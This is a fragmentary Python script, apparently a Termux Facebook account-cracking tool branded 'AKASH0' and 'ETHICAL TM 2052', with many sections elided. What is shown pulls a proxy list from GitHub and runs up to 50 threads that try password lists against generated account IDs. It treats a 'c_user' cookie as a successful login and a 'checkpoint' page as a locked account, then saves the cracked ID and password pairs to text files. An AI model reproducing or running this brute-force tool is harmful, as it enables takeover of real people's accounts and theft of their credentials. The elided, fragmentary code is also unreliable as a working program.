...
try:
	prox= requests.get('https://github.com/ethicalakash2052/Akash-TM2052/blob/main/Akash-TM2052.txt').text
...
\033[1;34m--------------------------------------------------
\033[1;39m \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m: \033[1;33mAKASH Mia
\033[1;39m \033[0;92m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m: \033[1;32m ETHICAL TM 2052 
\033[1;39m \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m: \033[1;33mAkash Mia 
\033[1;39m \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m: \033[1;34mETHICAL TM 2052
...
def menu():
			...
			if rifat in ['1','01']:
				...
				linex()
				print(' Example : /sdcard/Akash.txt')
				linex()
				...
				os.system('xdg-open https://www.facebook.com/tigerakash.aloneboy');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mAKASH0\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[AKASH0-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/AKASH0-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[AKASH0-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/AKASH0-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[AKASH0-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/AKASH0-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def chos():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\x1b[1;91m Akash Mia ( Jamalpur ')
        linex()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[AKASH0-OK] '+cid+' | '+ps+'\033[1;32m')
				open('AKASH0-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[AKASH0-CP] '+cid+' | '+ps+'\33[0;97m')
				open('AKASH0-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
